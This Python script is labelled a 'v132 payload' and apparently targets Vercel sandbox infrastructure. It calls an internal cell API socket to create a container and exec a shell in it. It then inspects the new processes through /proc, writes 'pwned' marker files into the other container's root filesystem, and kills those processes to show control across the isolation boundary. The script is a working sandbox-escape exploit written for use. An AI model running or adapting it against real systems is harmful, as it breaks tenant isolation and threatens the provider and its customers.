# -*- coding: utf-8 -*-
"""v132 payload: Exec -> 解剖新 sh 进程 root/cgroup -> 判定执行环境 + marker 写 + kill 验证
输出 /vercel/sandbox/v132c.out"""
import socket, struct, time, json, os, signal

OUT = '/vercel/sandbox/v132c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)

CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PROC = '/vercel.hive.cell.api.processes.v1.ProcessService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body, t=6.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return status, d[hdr_end + 4:hdr_end + 4 + 500] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def scan():
    out = {}
    try:
        for d in os.listdir('/proc'):
            if d.isdigit():
                try:
                    out[int(d)] = open('/proc/%s/comm' % d).read().strip()
                except Exception:
                    pass
    except Exception:
        pass
    return out


def pinfo(pid):
    res = []
    for p in ['cmdline', 'cgroup']:
        try:
            v = open('/proc/%d/%s' % (pid, p), 'rb').read()[:400].replace(b'\x00', b' ')
            res.append('%s=%r' % (p, v.decode(errors='replace')))
        except Exception as e:
            res.append('%s=EXC %s' % (p, e))
    try:
        st = open('/proc/%d/status' % pid).read()[:800]
        res.append('status=' + '|'.join(l for l in st.splitlines() if l.startswith(('Name:', 'NSpid:', 'CapEff:', 'Seccomp:', 'Uid:'))))
    except Exception as e:
        res.append('status=EXC %s' % e)
    return ' '.join(res)


# 1: Create + Start + Exec
log('=== 1 create-start-exec ===')
st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=12)
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('Create -> %s cid=%s' % (st, cid))
if not cid:
    f.close()
    raise SystemExit
st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
log('Start -> %s' % st)

before = None
CMD = "echo V132EXEC > /dev/null; sleep 300"
pid = None
for attempt in range(12):
    st, pay = connect_unix(CELL, '%s/Exec' % CTRS,
                           json.dumps({'containerId': cid, 'process': {'args': ['/bin/sh', '-c', CMD]}}).encode(), t=6)
    if '200' in st:
        log('Exec ok @try%d -> %s %r' % (attempt, st, pay[:300]))
        try:
            pid = json.loads(pay.decode()).get('processId')
        except Exception:
            pass
        break
    time.sleep(0.02)
if not pid:
    log('Exec all failed, last %s' % st)
log('processId=%s' % pid)

# 2: Exec 成功后立即扫描找新 sh/sleep 进程
log('=== 2 find new procs ===')
found = []
before = scan()
for i in range(20):
    after = scan()
    newp = [p for p in after if p not in before and after[p] in ('sh', 'sleep')]
    if newp:
        found = newp
        log('new sh/sleep pids: %s' % found)
        break
    time.sleep(0.2)

# 3: 解剖
log('=== 3 dissect ===')
for p in found:
    log('PID %d: %s' % (p, pinfo(p)))
    # root 环境判定
    try:
        v = open('/proc/%d/root/proc/1/cmdline' % p, 'rb').read()[:300].replace(b'\x00', b' ')
        log('PID %d root/proc/1/cmdline=%r' % (p, v.decode(errors='replace')))
    except Exception as e:
        log('PID %d root/proc/1 EXC %s' % (p, e))
    try:
        log('PID %d root/ls=%s' % (p, os.listdir('/proc/%d/root' % p)[:40]))
    except Exception as e:
        log('PID %d root/ls EXC %s' % (p, e))
    try:
        h = open('/proc/%d/root/etc/hostname' % p).read().strip()
        log('PID %d hostname=%r' % (p, h))
    except Exception as e:
        log('PID %d hostname EXC %s' % (p, e))
    # marker 写 + 读回
    for mp in ['tmp/V132M', 'etc/V132M', 'V132M', 'root/V132M']:
        try:
            with open('/proc/%d/root/%s' % (p, mp), 'w') as mf:
                mf.write('pwned-%d' % p)
            log('PID %d wrote root/%s OK' % (p, mp))
            r = open('/proc/%d/root/%s' % (p, mp)).read().strip()
            log('PID %d readback root/%s=%r' % (p, mp, r))
        except Exception as e:
            log('PID %d root/%s EXC %s' % (p, mp, e))
    # kill 验证
    try:
        os.kill(p, 0)
        log('PID %d alive' % p)
        os.kill(p, signal.SIGKILL)
        log('PID %d SIGKILL sent' % p)
        time.sleep(0.5)
        try:
            os.kill(p, 0)
            log('PID %d STILL ALIVE' % p)
        except OSError:
            log('PID %d gone after kill' % p)
    except Exception as e:
        log('PID %d kill EXC %s' % (p, e))

# 4: StreamOutput 最后一次尝试
log('=== 4 stream ===')
if pid:
    try:
        preq = b'\x0a' + bytes([len(pid)]) + pid.encode() + b'\x10\x01'
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect(CELL)
        env1 = b'\x00' + struct.pack('>I', len(preq)) + preq
        req = ('POST %s/StreamOutput HTTP/1.1\r\nHost: unix\r\nContent-Type: application/connect+proto\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\n\r\n' % (PROC, len(env1))).encode() + env1
        s.sendall(req)
        s.shutdown(socket.SHUT_WR)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        log('SO %s body=%r' % (d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP', d[-800:]))
    except Exception as e:
        log('SO EXC %s' % e)

# cleanup
st, pay = connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
log('Cleanup Kill -> %s' % st)

log('V132_DONE')
f.close()
